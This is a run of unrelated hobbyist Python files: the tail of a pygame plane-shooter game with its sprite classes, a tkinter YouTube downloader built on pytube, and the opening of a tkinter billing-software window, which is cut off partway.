        elif keys_pressed[pygame.K_UP]:
            self.heros_move(0, -5)
        elif keys_pressed[pygame.K_DOWN]:
            self.heros_move(0, 5)
        else:
            self.heros_move(0, 0)

    def heros_move(self, x=0, y=0):
        self.hero.speedx = x
        self.hero.speedy = y

    def bomb_throw(self):
        music_use_bomb = pygame.mixer.Sound("./music/use_bomb.wav")
        if self.hero.bomb > 0:
            music_use_bomb.play()
            self.hero.bomb -= 1
            self.bombs.pop()
            for enemy in self.enemy_group:
                if enemy.number < 3:
                    enemy.bar.length = 0
                    enemy.isboom = True
                else:
                    enemy.injury = 20
                    enemy.isboom = True

    def __check_collide(self):

        # 1. 子弹摧毁敌机
        for enemy in self.enemy_group:
            for hero in self.hero_group:
                for bullet in hero.bullets:
                    if pygame.sprite.collide_mask(bullet, enemy):  # 这种碰撞检测可以精确到像素去掉alpha遮罩的那种哦
                        bullet.kill()
                        enemy.injury = bullet.hity
                        enemy.isboom = True
                        if enemy.bar.length <= 0:
                            self.enemy_group.remove(enemy)
                            self.enemy_boom.add(enemy)

        # 2. 敌机撞毁英雄
        for enemy in self.enemy_group:
            if pygame.sprite.collide_mask(self.hero, enemy):
                if enemy.number < 3:
                    enemy.bar.length = 0  # 敌机直接死
                    self.hero.injury = self.hero.bar.value / 4  # 英雄掉四分之一的血
                    if self.hero.buff1_num > 0:
                        self.hero.buff1_num -= 1
                        self.hero.music_degrade.play()
                    self.enemy_group.remove(enemy)
                    self.enemy_boom.add(enemy)
                    enemy.isboom = True
                else:
                    self.hero.bar.length = 0
                self.hero.isboom = True

        # 子弹摧毁英雄
        for bullet in self.enemy_bullet_group:
            if pygame.sprite.collide_mask(self.hero, bullet):
                bullet.kill()
                self.hero.injury = 1
                if self.hero.buff1_num > 0:
                    self.hero.music_degrade.play()
                    if self.hero.buff1_num == 5:
                        self.mate1.kill()
                        self.mate2.kill()
                    self.hero.buff1_num -= 1

                self.hero.isboom = True

        if not self.hero.alive():
            self.hero.rect.right = -10  # 把英雄移除屏幕
            if self.hero.buff1_num == 5:
                self.mate1.rect.right = -10
                self.mate2.rect.right = -10
            self.game_over = True

        # 3.buff吸收
        for buff in self.buff1_group:
            if pygame.sprite.collide_mask(self.hero, buff):
                buff.music_get.play()
                if buff.speedy == 1:  # 用速度来区分
                    if self.hero.buff1_num < 6:
                        self.hero.buff1_num += 1
                        self.hero.music_upgrade.play()
                        if self.hero.buff1_num == 5:
                            self.team_show()

                elif buff.speedy == 2:
                    self.hero.bomb += 1
                    image = pygame.image.load("./images/bomb.png")
                    self.bombs.append(image)
                elif buff.speedy == 3:
                    if self.hero.bar.length < self.hero.bar.weight * self.hero.bar.value:
                        self.hero.bar.length += self.hero.bar.weight * self.hero.bar.value
                buff.kill()

    def team_show(self):
        self.mate1 = Heromate(-1)
        self.mate2 = Heromate(1)
        self.mate1.image = pygame.image.load("./images/life.png")
        self.mate1.rect = self.mate1.image.get_rect()
        self.mate2.image = pygame.image.load("./images/life.png")
        self.mate2.rect = self.mate2.image.get_rect()
        self.hero_group.add(self.mate1)
        self.hero_group.add(self.mate2)

    # 各种更新
    def __update_sprites(self):

        self.back_group.update()
        self.back_group.draw(self.screen)

        self.enemy_group.update()
        self.enemy_group.draw(self.screen)

        self.enemy_boom.update()
        self.enemy_boom.draw(self.screen)

        self.heros_update()
        self.hero_group.draw(self.screen)

        for hero in self.hero_group:
            hero.bullets.update()
            hero.bullets.draw(self.screen)

        self.buff1_group.update()
        self.buff1_group.draw(self.screen)

        self.bars_update()
        self.bombs_update()

        self.enemy_bullet_group.update()
        self.enemy_bullet_group.draw(self.screen)

        self.score_show()

    def heros_update(self):
        for hero in self.hero_group:
            if hero.number == 1:
                hero.rect.bottom = self.hero.rect.bottom
                hero.rect.left = self.hero.rect.right
            if hero.number == -1:
                hero.rect.bottom = self.hero.rect.bottom
                hero.rect.right = self.hero.rect.left
            hero.update()

    def bars_update(self):
        for bar in self.bars:
            if bar.length > 0:
                bar.update(self.screen)
            else:
                self.bars.remove(bar)

    def bullet_enemy_update(self):
        for enemy in self.enemy_group:
            enemy.bullets.update()
            enemy.bullets.draw(self.screen)

    def bombs_update(self):
        i = 1
        for bomb in self.bombs:
            self.screen.blit(bomb, (0, 700 - (bomb.get_rect().height) * i))
            i += 1

    def score_show(self):
        score_font = pygame.font.Font("./STCAIYUN.ttf", 33)
        image = score_font.render("SCORE:" + str(int(self.score.getvalue())), True, color_gray)
        rect = image.get_rect()
        rect.bottom, rect.right = 700, 480
        self.screen.blit(image, rect)

    @staticmethod
    def __start__():
        # 创建游戏对象
        game = PlaneGame()

        # 启动游戏
        game.start_game()


if __name__ == '__main__':
    PlaneGame.__start__()

import random
import pygame

pygame.init()
# **************************************************************
# FileName: plane_sprites.py***************************************
# Author:  Junieson *********************************************
# Version:  2019.8.12 ******************************************
# ****************************************************************
# 分数
SCORE = 0
# 屏幕大小的常量
SCREEN_RECT = pygame.Rect(0, 0, 480, 700)
# color
color_blue = (30, 144, 255)
color_green = (0, 255, 0)
color_red = (255, 0, 0)
color_purple = (148, 0, 211)
color_gray = (251, 255, 242)
# 刷新的帧率
FRAME_PER_SEC = 60  # 刷新率是60hz,即每秒update60次
# 创建敌机的定时器常量,自定义用户事件,其实就是int数,不同数表示不同事件
CREATE_ENEMY_EVENT = pygame.USEREVENT
# 英雄发射子弹事件
HERO_FIRE_EVENT = pygame.USEREVENT + 1
# buff1 出现的事件
BUFF1_SHOW_UP = pygame.USEREVENT + 2
# buff2
BUFF2_SHOW_UP = pygame.USEREVENT + 3
# 敌军发射子弹
ENEMY_FIRE_EVENT = pygame.USEREVENT + 4
# 发射炸弹
BOMB_THROW = pygame.USEREVENT + 5


class GameScore(object):
    global SCORE

    def __init__(self):
        self.score = 0
        pass

    def getvalue(self):
        self.score = SCORE
        return self.score


class GameSprite(pygame.sprite.Sprite):
    """飞机大战游戏精灵"""

    def __init__(self, image_name, speedy=1, speedx=0):
        # 调用父类的初始化方法
        super().__init__()

        # 定义对象的属性
        self.image = pygame.image.load(image_name)
        self.rect = self.image.get_rect()
        self.speedy = speedy
        self.speedx = speedx
        self.injury = 1
        self.index = 0  # 记帧数变量
        self.bar = bloodline(color_blue, self.rect.x, self.rect.y - 10, self.rect.width)

    def update(self):
        # 在屏幕的垂直方向上移动
        self.rect.y += self.speedy
        self.rect.x += self.speedx
        self.bar.x = self.rect.x
        self.bar.y = self.rect.y - 10


class Background(GameSprite):
    """游戏背景精灵"""

    def __init__(self, is_alt=False):

        # 1. 调用父类方法实现精灵的创建(image/rect/speed)
        super().__init__("./images/background.png")

        # 2. 判断是否是交替图像，如果是，需要设置初始位置
        if is_alt:
            self.rect.y = -self.rect.height

    def update(self):

        # 1. 调用父类的方法实现
        super().update()

        # 2. 判断是否移出屏幕，如果移出屏幕，将图像设置到屏幕的上方
        if self.rect.y >= SCREEN_RECT.height:
            self.rect.y = -self.rect.height


class Boss(GameSprite):

    def __init__(self):
        super().__init__("./images/enemy3_n1.png", 0, 1)
        self.music_boom = pygame.mixer.Sound("./music/enemy3_down.wav")
        self.music_fly = pygame.mixer.Sound("./music/enemy3_flying.wav")
        self.music_fly.play(-1)
        self.rect.centerx = 240
        self.y = 200
        self.isboom = False
        self.number = 3
        self.index1 = 1  # 控制动画速度
        self.index2 = 0
        self.index3 = 0
        self.index4 = 0
        self.injury = 1
        self.bar = bloodline(color_purple, 0, 0, 480, 8, 200)
        self.bullets = pygame.sprite.Group()

    def fire(self):
        for j in range(2, 7):  # 每层5个
            bullet = Bullet(0, 1)
            bullet.injury = 1
            # 2. 设置精灵的位置
            bullet.rect.centerx = self.rect.centerx
            bullet.rect.y = self.rect.bottom
            if j == 2:
                bullet.speedx = 0
            else:
                bullet.speedx = (-1) ** j * ((j - 1) // 2) * 1

            self.bullets.add(bullet)

    def update(self):
        # 左右移
        global SCORE
        if self.index4 % 2 == 0:  # 降低帧速率,注意这两个指针不能一样
            # 内部为左右移动大概50像素
            if self.index3 % 50 == 0 and (self.index3 // 50) % 2 == 1:
                self.speedx = -self.speedx
            self.rect.x += self.speedx
            self.index3 += 1
        self.index4 += 1

        # 发电动画
        self.image = pygame.image.load("./images/enemy3_n" + str((self.index1 // 6) % 2 + 1) + ".png")
        self.index1 += 1

        # 爆炸动画
        if self.isboom:
            self.bar.length -= self.injury * self.bar.weight
            if self.bar.length <= 0:  # 此时满足爆炸的条件了
                self.music_fly.stop()
                if self.index2 == 0:
                    self.music_boom.play()
                if self.index2 < 29:  # 4*7+1
                    self.image = pygame.image.load("./images/enemy3_down" + str(self.index2 // 7) + ".png")
                    # 这个地方之所以要整除4是为了减慢爆炸的速度，如果按照update的频率60hz就太快了
                    self.index2 += 1
                else:
                    self.kill()
                    SCORE += self.bar.value
            else:
                self.isboom = False  # 否则还不能死


class Enemy(GameSprite):
    """敌机精灵"""

    def __init__(self, num=1):
        self.number = num
        # 1. 调用父类方法，创建敌机精灵，同时指定敌机图片
        super().__init__("./images/enemy" + str(num) + ".png")

        # music
        if num == 1:
            self.music_boom = pygame.mixer.Sound("./music/enemy1_down.wav")
        else:
            self.music_boom = pygame.mixer.Sound("./music/enemy2_down.wav")
        # 2. 指定敌机的初始随机速度 1 ~ 3
        self.speedy = random.randint(1, 3)

        # 3. 指定敌机的初始随机位置
        self.rect.bottom = 0
        max_x = SCREEN_RECT.width - self.rect.width
        self.rect.x = random.randint(0, max_x)

        # 4.爆炸效果
        self.isboom = False
        self.index = 0

        # 5.血条
        if self.number == 1:
            self.bar = bloodline(color_blue, self.rect.x, self.rect.y, self.rect.width)
        else:
            self.bar = bloodline(color_blue, self.rect.x, self.rect.y, self.rect.width, 3, 4)

        # 6,子弹
        self.bullets = pygame.sprite.Group()

    def fire(self):
        for i in range(0, 2):
            # 1. 创建子弹精灵
            bullet = Bullet(0, random.randint(self.speedy + 1, self.speedy + 3))
            # 2. 设置精灵的位置
            bullet.rect.bottom = self.rect.bottom + i * 20
            bullet.rect.centerx = self.rect.centerx

            # 3. 将精灵添加到精灵组
            self.bullets.add(bullet)

    def update(self):
        global SCORE
        # 1. 调用父类方法，保持垂直方向的飞行
        super().update()

        # 2. 判断是否飞出屏幕，如果是，需要从精灵组删除敌机
        if self.rect.y > SCREEN_RECT.height:
            # print("飞出屏幕，需要从精灵组删除...")
            # kill方法可以将精灵从所有精灵组中移出，精灵就会被自动销毁
            self.kill()
            self.bar.length = 0

        if self.isboom:
            self.bar.length -= self.bar.weight * self.injury
            if self.bar.length <= 0:
                if self.index == 0:  # 保证只响一次
                    self.music_boom.play()
                if self.index < 17:  # 4*4+1
                    self.image = pygame.image.load(
                        "./images/enemy" + str(self.number) + "_down" + str(self.index // 4) + ".png")
                    # 这个地方之所以要整除4是为了减慢爆炸的速度，如果按照update的频率60hz就太快了
                    self.index += 1
                else:
                    self.kill()
                    SCORE += self.bar.value


            else:
                self.isboom = False


class Hero(GameSprite):
    """英雄精灵"""

    def __init__(self):
        # 1. 调用父类方法，设置image&speed
        super().__init__("./images/me1.png")
        self.music_down = pygame.mixer.Sound("./music/me_down.wav")
        self.music_upgrade = pygame.mixer.Sound("./music/upgrade.wav")
        self.music_degrade = pygame.mixer.Sound("./music/supply.wav")

        self.number = 0
        # 2. 设置英雄的初始位置
        self.rect.centerx = SCREEN_RECT.centerx
        self.rect.bottom = SCREEN_RECT.bottom - 120

        # 3. 创建子弹的精灵组
        self.bullets = pygame.sprite.Group()
        # 4.爆炸
        self.isboom = False
        self.index1 = 1  # 控制动画速度
        self.index2 = 0
        # 5.buff1加成
        self.buff1_num = 0
        # 6,英雄血条
        self.bar = bloodline(color_green, 0, 700, 480, 8, 10)
        # 7，炸弹数目
        self.bomb = 0

    def update(self):

        # 英雄在水平方向移动和血条不同步,特殊
        self.rect.y += self.speedy
        self.rect.x += self.speedx

        # 控制英雄不能离开屏幕
        if self.rect.x < 0:
            self.rect.x = 0
        elif self.rect.right > SCREEN_RECT.right:
            self.rect.right = SCREEN_RECT.right
        elif self.rect.y < 0:
            self.rect.y = 0
        elif self.rect.bottom > SCREEN_RECT.bottom:
            self.rect.bottom = SCREEN_RECT.bottom

        # 英雄喷气动画

        self.image = pygame.image.load("./images/me" + str((self.index1 // 6) % 2 + 1) + ".png")
        self.index1 += 1

        # 英雄爆炸动画
        if self.isboom:
            self.bar.length -= self.injury * self.bar.weight
            if self.bar.length <= 0:  # 此时满足爆炸的条件了
                if self.index2 == 0:
                    self.music_down.play()
                if self.index2 < 17:  # 4*4+1
                    self.image = pygame.image.load("./images/me_destroy_" + str(self.index2 // 4) + ".png")
                    # 这个地方之所以要整除4是为了减慢爆炸的速度，如果按照update的频率60hz就太快了
                    self.index2 += 1
                else:
                    self.kill()
            else:
                self.isboom = False  # 否则还不能死

    # 发射子弹
    def fire(self):
        if self.buff1_num == 0:
            for i in range(0, 1):
                # 1. 创建子弹精灵
                bullet = Bullet()

                # 2. 设置精灵的位置
                bullet.rect.bottom = self.rect.y - i * 20
                bullet.rect.centerx = self.rect.centerx

                # 3. 将精灵添加到精灵组
                self.bullets.add(bullet)
        elif self.buff1_num <= 3:
            for i in (0, 1):
                # 1. 创建子弹精灵
                for j in range(2, self.buff1_num + 3):
                    bullet = Bullet(2, -3)
                    # 2. 设置精灵的位置
                    bullet.rect.bottom = self.rect.y - i * 20
                    if (self.buff1_num % 2 == 1):
                        bullet.rect.centerx = self.rect.centerx + (-1) ** j * 15 * (j // 2)
                    if (self.buff1_num % 2 == 0):
                        if j == 2:
                            bullet.rect.centerx = self.rect.centerx
                        else:
                            bullet.rect.centerx = self.rect.centerx + (-1) ** j * 15 * ((j - 1) // 2)
                    # 3. 将精灵添加到精灵组
                    self.bullets.add(bullet)
        elif self.buff1_num >= 4:
            for i in range(0, 1):
                # 1. 表示有几层
                for j in range(2, 5):  # 每层三个

                    bullet = Bullet(3, -3)
                    bullet.injury = 2
                    # 2. 设置精灵的位置
                    bullet.rect.bottom = self.rect.y
                    if j == 2:
                        bullet.rect.centerx = self.rect.centerx
                    else:
                        bullet.rect.centerx = self.rect.centerx + (-1) ** j * (30 + 5 * i)
                        bullet.speedx = (-1) ** j * (i + 1)
                    self.bullets.add(bullet)


class Heromate(Hero):
    def __init__(self, num):
        super().__init__()
        self.image = pygame.image.load("./images/life.png")
        self.number = num

    def update(self):

        if self.rect.right > SCREEN_RECT.right:
            self.rect.right = SCREEN_RECT.right
        if self.rect.x < 0:
            self.rect.x = 0
        if self.rect.y < 0:
            self.rect.y = 0
        elif self.rect.bottom > SCREEN_RECT.bottom:
            self.rect.bottom = SCREEN_RECT.bottom

    def fire(self):
        for i in range(0, 1, 2):
            # 1. 创建子弹精灵
            bullet = Bullet()
            # 2. 设置精灵的位置
            bullet.rect.bottom = self.rect.y - i * 20
            bullet.rect.centerx = self.rect.centerx
            # 3. 将精灵添加到精灵组
            self.bullets.add(bullet)


class Bullet(GameSprite):
    """子弹精灵"""

    def __init__(self, color=1, speedy=-2, speedx=0):
        # 调用父类方法，设置子弹图片，设置初始速度
        self.hity = color  # 子弹伤害值
        self.music_shoot = pygame.mixer.Sound("./music/bullet.wav")
        self.music_shoot.set_volume(0.4)
        if color > 0:  # 只让英雄发子弹响
            self.music_shoot.play()
        super().__init__("./images/bullet" + str(color) + ".png", speedy, speedx)

    def update(self):
        # 调用父类方法，让子弹沿垂直方向飞行
        super().update()

        # 判断子弹是否飞出屏幕
        if self.rect.bottom < 0 or self.rect.y > 700:
            self.kill()


class Buff1(GameSprite):
    def __init__(self):
        super().__init__("./images/bullet_supply.png", 1)
        self.music_get = pygame.mixer.Sound("./music/get_bullet.wav")
        self.rect.bottom = 0
        max_x = SCREEN_RECT.width - self.rect.width
        self.rect.x = random.randint(0, max_x)

    def update(self):
        super().update()
        if self.rect.bottom < 0:
            self.kill()


class Buff2(GameSprite):
    def __init__(self):
        super().__init__("./images/bomb_supply.png", 2)
        self.music_get = pygame.mixer.Sound("./music/get_bomb.wav")
        self.rect.bottom = random.randint(0, 700)
        max_x = SCREEN_RECT.width - self.rect.width
        self.rect.x = random.randint(0, max_x)
        self.ran = random.randint(60, 180)  # 在持续1~3s后消失

    def update(self):
        super().update()
        if self.rect.bottom < 0 or self.index == self.ran:
            self.kill()
        self.index += 1


class Buff3(Buff2):
    def __init__(self):
        super().__init__()
        self.image = pygame.image.load("./images/buff3.png")
        self.speedy = 3


class bloodline(object):
    def __init__(self, color, x, y, length, width=2, value=2):
        self.color = color
        self.x = x
        self.y = y
        self.length = length
        self.width = width  # 线宽
        self.value = value * 1.0  # 血量用浮点数
        self.weight = length / value  # 每一滴血表示的距离
        self.color_init = color

    def update(self, canvas):
        if self.length <= self.value * self.weight / 2:
            self.color = color_red
        else:
            self.color = self.color_init
        self.bar_rect = pygame.draw.line(canvas, self.color, (self.x, self.y), (self.x + self.length, self.y),
                                         self.width)


class CanvasOver():
    def __init__(self, screen):
        self.img_again = pygame.image.load("./images/again.png")
        self.img_over = pygame.image.load("./images/gameover.png")
        self.rect_again = self.img_again.get_rect()
        self.rect_over = self.img_over.get_rect()
        self.rect_again.centerx = self.rect_over.centerx = SCREEN_RECT.centerx
        self.rect_again.bottom = SCREEN_RECT.centery
        self.rect_over.y = self.rect_again.bottom + 20
        self.screen = screen

    def event_handler(self, event):
        if event.type == pygame.MOUSEBUTTONDOWN:
            pos = pygame.mouse.get_pos()
            if self.rect_again.left < pos[0] < self.rect_again.right and \
                    self.rect_again.top < pos[1] < self.rect_again.bottom:
                return 1
            elif self.rect_over.left < pos[0] < self.rect_over.right and \
                    self.rect_over.top < pos[1] < self.rect_over.bottom:
                return 0

    def update(self):
        self.screen.blit(self.img_again, self.rect_again)
        self.screen.blit(self.img_over, self.rect_over)
        score_font = pygame.font.Font("./STCAIYUN.ttf", 50)
        image = score_font.render("SCORE:" + str(int(SCORE)), True, color_gray)
        rect = image.get_rect()
        rect.centerx, rect.bottom = SCREEN_RECT.centerx, self.rect_again.top - 20
        self.screen.blit(image, rect)


# =================== PASSED ===========================
# Fix Resolution Software Youtube Video Downloader
# Add someone variabel in video downloader
# And pop up show messagebox download started
# ======================================================


# ================= Importing Modules ===================
from tkinter import *
import tkinter as tk
from datetime import datetime
from PIL import ImageTk, Image
from tkinter.filedialog import askdirectory
from tkinter import messagebox
import time
from pytube import YouTube
from pytube import Playlist
from tkinter.ttk import Progressbar
from tkinter.scrolledtext import ScrolledText
import os

# ===========================================================
youtubeLogo = os.path.join(os.getcwd(), "Advance Youtube Downloader\youtube.png")


class YoutubeDownloader():

    # ========== Video Path ===================
    def select_v_path(self):
        self.location = askdirectory()

        if self.video_path.get() != "":
            self.video_path.delete(0, END)
            self.video_path.insert(END, self.location)
        else:
            self.video_path.insert(END, self.location)

    # ============= Playlist Path ================
    def select_p_path(self):
        self.location = askdirectory()

        if self.playlist_path.get() != "":
            self.playlist_path.delete(0, END)
            self.playlist_path.insert(END, self.location)
        else:
            self.playlist_path.insert(END, self.location)

    # =======================  Downloading Video ====================
    def download_video(self):
        if self.video_url.get() == "":
            messagebox.showerror("Error", "Please Paste Video URL")
        elif 'https://' not in self.video_url.get():
            messagebox.showerror("Error", "Wrong Video Url")
        elif self.video_path.get() == "":
            messagebox.showerror("Error", "Please provide Path")
        else:
            # try:
            # Just fix resolution video and add variabel in video downloader
            # And create messagebox show info download started.
            self.url = self.video_url.get()
            self.path = self.video_path.get()
            self.video = YouTube(self.url).streams
            self.stream = self.video.filter(
                file_extension="mp4", res="720p",
                only_audio=False
            ).first()
            messagebox.showinfo("Information Download Video",
                                "Download Started Just Wait Pop Up Show For Done Download Video.")

            self.root = tk.Tk()
            self.root.geometry('300x150')
            self.root.maxsize(300, 150)
            self.root.minsize(300, 150)
            self.root.title('Video Dowloading')
            self.root['bg'] = "white"

            self.start_downloading = Label(self.root, text="Video downloading .....", fg="red",
                                           font=('verdana', 10, 'bold'), bg="white")
            self.start_downloading.place(x=40, y=10)

            self.stream.download(output_path=self.path, filename=None)

            self.progress = Progressbar(self.root, orient=HORIZONTAL, length=250, mode='determinate')
            self.progress['value'] = 20
            self.root.update_idletasks()
            self.progress['value'] = 40
            self.root.update_idletasks()
            self.progress['value'] = 60
            self.root.update_idletasks()
            self.progress['value'] = 80
            self.root.update_idletasks()
            self.progress['value'] = 100
            self.root.update_idletasks()
            self.progress.place(x=20, y=40)

            self.dow_details = ScrolledText(self.root, width=30, height=3, font=('verdana', 8, 'bold'))
            self.dow_details.place(x=20, y=70)
            self.dow_details.insert(END, f'{self.video_path.get()}')

            self.dow_success = Label(self.root, text="Video downloaded successfully .....", fg="red",
                                     font=('verdana', 10, 'bold'), bg="white")
            self.dow_success.place(x=10, y=120)

            self.root.mainloop()

        # except:
        # time.sleep(10)
        # messagebox.showerror("Error","Unable to Download Video | Something went wrong !!")

        # ========================= End ==============================

    # =======================  Downloading Playlist ====================
    def download_playlist(self):
        if self.playlist_url.get() == "":
            messagebox.showerror("Error", "Please Paste playlist URL")
        elif 'https://' not in self.playlist_url.get():
            messagebox.showerror("Error", "Wrong playlist Url")
        elif self.playlist_path.get() == "":
            messagebox.showerror("Error", "Please provide Path")
        else:
            try:
                self.url = self.playlist_url.get()
                self.path = self.playlist_path.get()
                self.playlist = Playlist(self.url)

                self.root = tk.Tk()
                self.root.geometry('300x150')
                self.root.maxsize(300, 150)
                self.root.minsize(300, 150)
                self.root.title('Playlist Dowloading')
                self.root['bg'] = "white"

                self.start_downloading = Label(self.root, text="Playlist downloading .....", fg="red",
                                               font=('verdana', 10, 'bold'), bg="white")
                self.start_downloading.place(x=40, y=10)

                for self.video in self.playlist:
                    self.video.streams.get_highest_resolution().download(output_path=self.path, filename=None)

                self.progress = Progressbar(self.root, orient=HORIZONTAL, length=250, mode='determinate')
                self.progress['value'] = 20
                self.root.update_idletasks()
                self.progress['value'] = 40
                self.root.update_idletasks()
                self.progress['value'] = 60
                self.root.update_idletasks()
                self.progress['value'] = 80
                self.root.update_idletasks()
                self.progress['value'] = 100
                self.root.update_idletasks()
                self.progress.place(x=20, y=40)

                self.dow_details = ScrolledText(self.root, width=30, height=3, font=('verdana', 8, 'bold'))
                self.dow_details.place(x=20, y=70)
                self.dow_details.insert(END, f'{self.playlist_path.get()}\n {self.video.title}')

                self.dow_success = Label(self.root, text="Playlist downloaded successfully .....", fg="red",
                                         font=('verdana', 10, 'bold'), bg="white")
                self.dow_success.place(x=10, y=120)

                self.root.mainloop()


            except:
                time.sleep(10)
                messagebox.showerror("Error", "Unable to Download Video | Something went wrong !!")

    # ========================= End ==============================

    # ======================== Clear =======================

    def Clear(self):
        self.video_url.delete(0, END)
        self.video_path.delete(0, END)
        self.playlist_url.delete(0, END)
        self.playlist_path.delete(0, END)

    # ======================== Quit =======================
    def Quit(self):
        self.root.destroy()

    # ==============================  Main Window ========================
    def __init__(self):
        self.root = tk.Tk()
        self.root.geometry('500x270')
        self.root.maxsize(500, 270)
        self.root.minsize(500, 270)
        self.root['bg'] = "white"
        self.root.title('Youtube Downloader')

        self.l1 = Label(self.root, text="Youtube Downloader", font=('verdana', 15, 'bold'), bg="white", fg="red")
        self.l1.place(x=130, y=5)

        self.design1 = Label(self.root, bg="red", width=20)
        self.design1.place(x=0, y=45)

        self.date = Label(self.root, text=datetime.now(), font=('verdana', 10, 'bold'), bg="white")
        self.date.place(x=140, y=45)

        self.design2 = Label(self.root, bg="red", width=20)
        self.design2.place(x=360, y=45)

        self.design3 = Label(self.root, bg="red", width=3, height=6)
        self.design3.place(x=242, y=90)

        self.yt_icon = ImageTk.PhotoImage(Image.open(youtubeLogo, mode="r"))
        self.logo = Label(self.root, image=self.yt_icon, bg="white")
        self.logo.place(x=220, y=70)

        # ==================== Video ============================

        self.frame1 = LabelFrame(self.root, text="Download Video", width=180, height=180, font=('verdana', 10, 'bold'),
                                 bg="white", fg="red", borderwidth=5, relief=SUNKEN, highlightcolor="red",
                                 highlightbackground="red")
        self.frame1.place(x=10, y=80)

        self.v_url = Label(self.frame1, text="Paste url Here ...", font=('verdana', 10, 'bold'), bg="white")
        self.v_url.place(x=20, y=2)

        self.video_url = Entry(self.frame1, width=24, relief=SUNKEN, borderwidth=2, bg="red", fg="white")
        self.video_url.place(x=10, y=30)

        self.v_path = Label(self.frame1, text="Select Path", font=('verdana', 10, 'bold'), bg="white")
        self.v_path.place(x=10, y=60)

        self.video_path = Entry(self.frame1, width=15, relief=SUNKEN, borderwidth=2, bg="red", fg="white")
        self.video_path.place(x=10, y=90)

        self.file = Button(self.frame1, text="Browser", font=('verdana', 8, 'bold'), relief=RAISED, bg="white",
                           command=self.select_v_path)
        self.file.place(x=105, y=88)

        self.download_video = Button(self.frame1, text="Download", font=('verdana', 9, 'bold'), relief=RAISED,
                                     bg="white", borderwidth=4, command=self.download_video)
        self.download_video.place(x=40, y=125)

        # =============== Palylist =======================

        self.frame2 = LabelFrame(self.root, text="Download Playlist", width=180, height=180,
                                 font=('verdana', 10, 'bold'), bg="white", fg="red", borderwidth=5, relief=SUNKEN,
                                 highlightcolor="red", highlightbackground="red")
        self.frame2.place(x=310, y=80)

        self.p_url = Label(self.frame2, text="Paste url Here ...", font=('verdana', 10, 'bold'), bg="white")
        self.p_url.place(x=20, y=2)

        self.playlist_url = Entry(self.frame2, width=24, relief=SUNKEN, borderwidth=2, bg="red", fg="white")
        self.playlist_url.place(x=10, y=30)

        self.p_path = Label(self.frame2, text="Select Path", font=('verdana', 10, 'bold'), bg="white")
        self.p_path.place(x=10, y=60)

        self.playlist_path = Entry(self.frame2, width=15, relief=SUNKEN, borderwidth=2, bg="red", fg="white")
        self.playlist_path.place(x=10, y=90)

        self.playlist_file = Button(self.frame2, text="Browser", font=('verdana', 8, 'bold'), relief=RAISED, bg="white",
                                    command=self.select_p_path)
        self.playlist_file.place(x=105, y=88)

        self.download_playlist = Button(self.frame2, text="Download", font=('verdana', 9, 'bold'), relief=RAISED,
                                        bg="white", borderwidth=4, command=self.download_playlist)
        self.download_playlist.place(x=40, y=125)

        self.clear = Button(self.root, text="Clear", font=('verdana', 10, 'bold'), bg="white", fg="red", padx=10,
                            relief=RAISED, borderwidth=3, command=self.Clear)
        self.clear.place(x=220, y=195)

        self.quit = Button(self.root, text="Quit", font=('verdana', 10, 'bold'), bg="red", fg="white", padx=15,
                           relief=RAISED, borderwidth=3, command=self.Quit)
        self.quit.place(x=220, y=230)

        self.root.mainloop()

        # =========================== End  =====================================


# ============== Calling ===========

if __name__ == '__main__':
    YoutubeDownloader()

# ====================================


from tkinter import *
import random
import os
from tkinter import messagebox


# ===============main=====================
class Bill_App:
    def __init__(self, root):
        self.root = root
        self.root.geometry("1350x700+0+0")
        self.root.title("Billing Software")
        bg_color = "#badc57"
        title = Label(self.root, text="Billing Software", font=('times new roman', 30, 'bold'), pady=2, bd=12,
                      bg="#badc57", fg="Black", relief=GROOVE)
        title.pack(fill=X)
        # ================variables=======================
        self.sanitizer = IntVar()
        self.mask = IntVar()
        self.hand_gloves = IntVar()
        self.syrup = IntVar()
        self.cream = IntVar()
        self.thermal_gun = IntVar()
        # ============grocery==============================
        self.rice = IntVar()
        self.food_oil = IntVar()
        self.wheat = IntVar()
        self.spices = IntVar()
        self.flour = IntVar()
        self.maggi = IntVar()
        # =============coldDrinks=============================
        self.sprite = IntVar()
        self.mineral = IntVar()
        self.juice = IntVar()
        self.coke = IntVar()
        self.lassi = IntVar()
        self.mountain_duo = IntVar()
        # ==============Total product price================
        self.medical_price = StringVar()
        self.grocery_price = StringVar()
        self.cold_drinks_price = StringVar()
        # ==============Customer==========================
        self.c_name = StringVar()
        self.c_phone = StringVar()
        self.bill_no = StringVar()
        x = random.randint(1000, 9999)
        self.bill_no.set(str(x))
        self.search_bill = StringVar()
        # ===============Tax================================
        self.medical_tax = StringVar()
        self.grocery_tax = StringVar()
        self.cold_drinks_tax = StringVar()
        # =============customer retail details======================
        F1 = LabelFrame(self.root, text="Customer Details", font=('times new roman', 15, 'bold'), bd=10, fg="Black",
                        bg="#badc57")
        F1.place(x=0, y=80, relwidth=1)

        cname_lbl = Label(F1, text="Customer Name:", bg=bg_color, font=('times new roman', 15, 'bold'))
        cname_lbl.grid(row=0, column=0, padx=20, pady=5)
        cname_txt = Entry(F1, width=15, textvariable=self.c_name, font='arial 15', bd=7, relief=GROOVE)
        cname_txt.grid(row=0, column=1, pady=5, padx=10)

        cphn_lbl = Label(F1, text="Customer Phone:", bg="#badc57", font=('times new roman', 15, 'bold'))
        cphn_lbl.grid(row=0, column=2, padx=20, pady=5)
        cphn_txt = Entry(F1, width=15, textvariable=self.c_phone, font='arial 15', bd=7, relief=GROOVE)
        cphn_txt.grid(row=0, column=3, pady=5, padx=10)

        c_bill_lbl = Label(F1, text="Bill Number:", bg="#badc57", font=('times new roman', 15, 'bold'))
        c_bill_lbl.grid(row=0, column=4, padx=20, pady=5)
        c_bill_txt = Entry(F1, width=15, textvariable=self.search_bill, font='arial 15', bd=7, relief=GROOVE)
        c_bill_txt.grid(row=0, column=5, pady=5, padx=10)

        bil_btn = Button(F1, text="Search", command=self.find_bill, width=10, bd=7, font=('arial', 12, 'bold'),
                         relief=GROOVE)
        bil_btn.grid(row=0, column=6, pady=5, padx=10)

        # ===================Medical====================================
        F2 = LabelFrame(self.root, text="Medical Purpose", font=('times new roman', 15, 'bold'), bd=10, fg="Black",
                        bg="#badc57")
        F2.place(x=5, y=180, width=325, height=380)

        sanitizer_lbl = Label(F2, text="Sanitizer", font=('times new roman', 16, 'bold'), bg="#badc57", fg="black")
        sanitizer_lbl.grid(row=0, column=0, padx=10, pady=10, sticky='W')
        sanitizer_txt = Entry(F2, width=10, textvariable=self.sanitizer, font=('times new roman', 16, 'bold'), bd=5,
                              relief=GROOVE)
